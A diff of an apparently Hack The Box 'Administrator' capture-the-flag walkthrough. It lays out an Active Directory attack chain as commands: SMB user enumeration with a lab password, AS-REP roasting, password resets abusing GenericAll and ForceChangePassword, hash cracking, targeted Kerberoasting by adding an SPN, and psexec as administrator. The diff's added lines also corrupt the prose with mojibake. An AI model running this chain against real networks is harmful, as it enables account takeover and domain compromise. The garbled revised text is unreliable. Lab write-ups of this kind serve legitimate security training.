@@ -1,9 +1,7 @@
----
+﻿---
 title: 'Administrator Walkthrough: Exploiting Active Directory Misconfigurations'
 date: 2024-11-24 19:00:00 +0530
-categories:
-- Capture the Flags
-- Windows
+categories: [red-teaming]
 tags:
 - HTB
 - ldap
@@ -77,7 +75,7 @@ No interesting information found in the UDP Scan results
 
 ### FTP Recon
 
-Since this was kinda assumed breach scenario we are provided with the user credentials ‘Olivia’.
+Since this was kinda assumed breach scenario we are provided with the user credentials â€˜Oliviaâ€™.
 
 ```bash
 ftp 10.10.11.42
@@ -90,11 +88,11 @@ Password:
 ftp: Login failed
 ```
 
-The login attempt with Olivia’s credentials failed, and the error message suggests that her home directory is inaccessible. This indicates that the FTP share on the machine does not provide any useful access for this user.
+The login attempt with Oliviaâ€™s credentials failed, and the error message suggests that her home directory is inaccessible. This indicates that the FTP share on the machine does not provide any useful access for this user.
 
 ### SMB Recon
 
-Given the open SMB port (445) and the provided credentials, I proceeded with SMB enumeration using the **`netexec`** (**`nxc`**) tool. The goal was to leverage Olivia’s account to enumerate users on the system.
+Given the open SMB port (445) and the provided credentials, I proceeded with SMB enumeration using theÂ **`netexec`**Â (**`nxc`**) tool. The goal was to leverage Oliviaâ€™s account to enumerate users on the system.
 
 ```bash
 nxc smb 10.10.11.42 -u Olivia -p 'ichliebedich'  --users    
@@ -115,13 +113,13 @@ SMB         10.10.11.42     445    DC               emma                        
 
 The SMB enumeration was successful. Key observations:
 
-1. Olivia’s credentials (**`ichliebedich`**) are valid and provide access to SMB.
-2. The domain is identified as **administrator.htb**, and the machine is running **Windows Server 2022 Build 20348 x64**.
-3. Multiple user accounts were enumerated, including **`michael`**, **`benjamin`**, **`emily`**, **`ethan`**, **`alexander`**, **`emma`**.
+1. Oliviaâ€™s credentials (**`ichliebedich`**) are valid and provide access to SMB.
+2. The domain is identified asÂ **administrator.htb**, and the machine is runningÂ **Windows Server 2022 Build 20348 x64**.
+3. Multiple user accounts were enumerated, including **`michael`**,Â **`benjamin`**,Â **`emily`**,Â **`ethan`**,Â **`alexander`**,Â **`emma`**.
 
 ### LDAP Recon
 
-To assess if any of the enumerated accounts had pre-authentication disabled (a common misconfiguration exploitable through AS-REP roasting), I used the **`GetNPUsers.py`** script from the Impacket toolkit.
+To assess if any of the enumerated accounts had pre-authentication disabled (a common misconfiguration exploitable through AS-REP roasting), I used theÂ **`GetNPUsers.py`**Â script from the Impacket toolkit.
 
 ```bash
 python3 /home/kali/Red_Team/Tools/impacket/examples/GetNPUsers.py administrator.htb/ -dc-ip 10.10.11.42 -no-pass -usersfile /home/kali/Red_Team/HTB/Administrator/users.txt -request  
@@ -136,7 +134,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)                                                                                    
 ```
 
-None of the enumerated accounts have the **`UF_DONT_REQUIRE_PREAUTH`** flag set. This indicates that pre-authentication is enforced for all these accounts, mitigating the risk of exploitation through AS-REP roasting.
+None of the enumerated accounts have theÂ **`UF_DONT_REQUIRE_PREAUTH`**Â flag set. This indicates that pre-authentication is enforced for all these accounts, mitigating the risk of exploitation through AS-REP roasting.
 
 ## Domain Enumeration
 
@@ -163,7 +161,7 @@ Uploaded the Winpeas to discover any potentials vectors to escalate privileges o
 
 ## Privilege Escalation to Michael
 
-With the identified permissions, I leveraged GenericAll to reset Michael’s password. This allowed me to escalate privileges to his account.
+With the identified permissions, I leveraged GenericAll to reset Michaelâ€™s password. This allowed me to escalate privileges to his account.
 
 ![image.png]({ '/assets/img/Administrator/image%204.png' | relative_url })
 
@@ -173,9 +171,9 @@ Successfully logged in with Michael's account.
 
 ![image.png]({ '/assets/img/Administrator/image%206.png' | relative_url })
 
-Enumerated Michael’s privileges and group memberships. The BloodHound map revealed that Michael has the ForceChangePassword privilege on the user Benjamin.
+Enumerated Michaelâ€™s privileges and group memberships. The BloodHound map revealed that Michael has the ForceChangePassword privilege on the user Benjamin.
 
-Continuing the attack chain, I used Michael’s privileges to reset Benjamin’s password.
+Continuing the attack chain, I used Michaelâ€™s privileges to reset Benjaminâ€™s password.
 
 Uploaded PowerView.ps1 to the target machine and executed the following command to reset Benjamin's password:
 
@@ -235,7 +233,7 @@ tekieromucho     (Backu)
 Use the "--show" option to display all of the cracked passwords reliably
 ```
 
-Tried with hashcat but it didn’t work
+Tried with hashcat but it didnâ€™t work
 
 ```bash
 hashcat -m 6800 ./HASH.TXT /usr/share/wordlists/rockyou.txt
@@ -269,7 +267,7 @@ Using BloodHound, I determined that Emily has the GenericWrite privilege over th
 
 Since emily has "GenericWrite" privileges on ethan, adding "serviceprincipalname" to the user "ethan". Making ethan as service account.
 
-With the GenericWrite privilege, I added a serviceprincipalname attribute to Ethan’s account, making it act as a service account. This change sets the stage for extracting a Kerberos TGS (Ticket-Granting Service).
+With the GenericWrite privilege, I added a serviceprincipalname attribute to Ethanâ€™s account, making it act as a service account. This change sets the stage for extracting a Kerberos TGS (Ticket-Granting Service).
 
 ```bash
 *Evil-WinRM* PS C:\Users\emily> Set-DomainObject -Identity ethan -Set @{serviceprincipalname='administrator/vegito'} -verbose
@@ -355,3 +353,4 @@ python3 /home/kali/Red_Team/Tools/impacket/examples/psexec.py administrator@10.1
 ## References:
 
 [NXC Cheatsheet](https://github.com/seriotonctf/cme-nxc-cheat-sheet)
+
